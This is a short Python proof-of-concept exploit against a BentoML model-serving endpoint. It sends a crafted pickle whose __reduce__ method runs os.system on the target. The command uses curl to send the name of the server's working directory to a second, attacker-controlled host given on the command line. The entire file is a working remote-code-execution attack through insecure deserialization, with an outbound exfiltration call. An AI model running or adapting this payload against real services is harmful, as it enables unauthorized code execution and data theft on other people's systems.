import pickle, os, requests
import sys

# Check if a hostname argument is passed
if len(sys.argv) < 3:
    print("HOSTNAMES not found.")
    sys.exit(1)

hostname1 = sys.argv[1]
hostname2 = sys.argv[2]

class P(object):
    def __reduce__(self):
        return (os.system,(f"curl http://{hostname2}:1234/?result=`basename $(pwd)`",))
    
requests.post(f'http://{hostname1}:3000/summarize', pickle.dumps(P()), headers={"Content-Type": "application/vnd.bentoml+pickle"})
